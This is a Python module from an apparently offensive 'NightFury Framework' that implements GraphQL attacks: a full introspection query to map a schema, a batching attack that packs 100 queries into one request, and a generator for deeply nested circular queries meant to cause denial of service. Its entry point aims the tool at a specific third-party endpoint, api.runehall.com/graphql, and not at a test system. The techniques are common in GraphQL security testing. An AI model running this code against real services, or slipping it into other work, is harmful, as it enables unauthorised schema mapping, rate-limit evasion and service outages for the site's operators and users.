"""
NightFury Framework - GraphQL Advanced Exploitation
Introspection-based mapping, batching attacks, and circular query DoS.
"""

import requests
import json
import logging
from typing import List, Dict, Optional

logger = logging.getLogger(__name__)

class RuneHallGraphQLExploiter:
    """
    Advanced exploitation for GraphQL APIs.
    """
    
    def __init__(self, endpoint: str, headers: Optional[Dict] = None):
        self.endpoint = endpoint
        self.headers = headers or {"Content-Type": "application/json"}
        
    def run_introspection(self) -> Dict:
        """
        Perform introspection to map the schema.
        """
        query = """
        query IntrospectionQuery {
          __schema {
            queryType { name }
            mutationType { name }
            subscriptionType { name }
            types {
              ...FullType
            }
            directives {
              name
              description
              locations
              args {
                ...InputValue
              }
            }
          }
        }

        fragment FullType on __Type {
          kind
          name
          description
          fields(includeDeprecated: true) {
            name
            description
            args {
              ...InputValue
            }
            type {
              ...TypeRef
            }
            isDeprecated
            deprecationReason
          }
          inputFields {
            ...InputValue
          }
          interfaces {
            ...TypeRef
          }
          enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
          }
          possibleTypes {
            ...TypeRef
          }
        }

        fragment InputValue on __InputValue {
          name
          description
          type { ...TypeRef }
          defaultValue
        }

        fragment TypeRef on __Type {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                    ofType {
                      kind
                      name
                      ofType {
                        kind
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
        """
        logger.info(f"[GRAPHQL] Running introspection on {self.endpoint}")
        try:
            response = requests.post(self.endpoint, json={'query': query}, headers=self.headers)
            return response.json()
        except Exception as e:
            logger.error(f"[GRAPHQL] Introspection failed: {e}")
            return {"error": str(e)}

    def batching_attack(self, query: str, count: int = 100) -> Dict:
        """
        Execute a batching attack by sending multiple queries in one request.
        """
        batch = [{'query': query} for _ in range(count)]
        logger.info(f"[GRAPHQL] Executing batching attack with {count} queries")
        try:
            response = requests.post(self.endpoint, json=batch, headers=self.headers)
            return response.json()
        except Exception as e:
            logger.error(f"[GRAPHQL] Batching attack failed: {e}")
            return {"error": str(e)}

    def circular_query_dos(self, depth: int = 10) -> str:
        """
        Generate a circular query to test for DoS vulnerabilities.
        """
        # This is a placeholder; actual implementation depends on schema
        # Example: user { friends { user { friends { ... } } } }
        query = "query { "
        for _ in range(depth):
            query += "user { friends { "
        query += "name "
        query += "} } " * depth
        query += "}"
        return query

if __name__ == "__main__":
    exploiter = RuneHallGraphQLExploiter("https://api.runehall.com/graphql")
    print("[*] GraphQL Exploitation Module Initialized")
